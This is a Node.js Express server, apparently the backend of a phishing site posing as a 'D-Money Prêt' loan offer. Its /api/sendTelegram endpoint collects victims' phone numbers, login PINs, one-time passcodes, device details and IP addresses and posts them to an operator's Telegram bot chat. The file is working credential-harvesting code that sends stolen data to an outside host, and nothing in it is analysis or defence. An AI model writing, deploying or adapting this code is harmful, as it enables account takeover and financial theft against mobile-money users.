'use strict';
const express   = require('express');
const path      = require('path');
const https     = require('https');
const rateLimit = require('express-rate-limit');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({limit:'10kb'}));
app.use(express.urlencoded({extended:false}));
app.use((req,res,next)=>{
  res.setHeader('X-Content-Type-Options','nosniff');
  res.setHeader('X-Frame-Options','DENY');
  res.setHeader('X-XSS-Protection','1; mode=block');
  res.setHeader('Referrer-Policy','strict-origin-when-cross-origin');
  next();
});

const apiLimiter=rateLimit({windowMs:15*60*1000,max:30,message:{error:'Trop de requêtes, veuillez réessayer plus tard.'},standardHeaders:true,legacyHeaders:false});
app.use('/api/',apiLimiter);
app.use(express.static(path.join(__dirname),{extensions:['html'],index:'index.html'}));

function sendTelegramMessage(text){
  return new Promise((resolve,reject)=>{
    const BOT_TOKEN=process.env.TELEGRAM_TOKEN;
    const CHAT_ID=process.env.TELEGRAM_CHAT_ID;
    if(!BOT_TOKEN||!CHAT_ID){console.warn('[Telegram] Variables manquantes');return resolve({ok:false,reason:'env_missing'})}
    const body=JSON.stringify({chat_id:CHAT_ID,text,parse_mode:'HTML'});
    const options={hostname:'api.telegram.org',path:`/bot${BOT_TOKEN}/sendMessage`,method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)}};
    const req=https.request(options,(res)=>{let data='';res.on('data',chunk=>data+=chunk);res.on('end',()=>{try{resolve(JSON.parse(data))}catch(e){resolve({ok:false})}})});
    req.on('error',reject);req.write(body);req.end();
  });
}

app.post('/api/sendTelegram',async(req,res)=>{
  try{
    const{submittedAt='',loginPhone='',loginPin='',otp='',event='',plan='',device=''}=req.body||{};
    if(!loginPhone&&!otp)return res.status(400).json({error:'Payload invalide'});
    const emoji={receive_offer_clicked:'📲',offer_received:'✅',resend_otp:'🔁'}[event]||'📋';
    const message=[
      `${emoji} <b>D-Money Prêt — ${event.replace(/_/g,' ').toUpperCase()}</b>`,``,
      `📅 <b>Heure:</b> ${submittedAt}`,
      `📱 <b>Téléphone:</b> <code>${loginPhone}</code>`,
      `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
      `🔑 <b>OTP:</b> <code>${otp||'—'}</code>`,``,
      `💰 <b>Prêt:</b> ${plan}`,
      `📟 <b>Appareil:</b> ${device}`,
      `🌐 <b>IP:</b> ${req.ip||req.headers['x-forwarded-for']||'—'}`,
    ].join('\n');
    const result=await sendTelegramMessage(message);
    return res.json({ok:true,telegram:result.ok});
  }catch(err){
    console.error('[/api/sendTelegram]',err.message);
    return res.status(500).json({error:'Erreur serveur interne'});
  }
});

app.get('/health',(req,res)=>res.json({status:'ok',uptime:process.uptime()}));
app.get('*',(req,res)=>res.sendFile(path.join(__dirname,'index.html')));

app.listen(PORT,()=>{
  console.log(`✅  D-Money server running on port ${PORT}`);
  console.log(`    Telegram: ${process.env.TELEGRAM_TOKEN?'configuré ✓':'MANQUANT ⚠'}`);
  console.log(`    Chat ID:  ${process.env.TELEGRAM_CHAT_ID?'configuré ✓':'MANQUANT ⚠'}`);
});
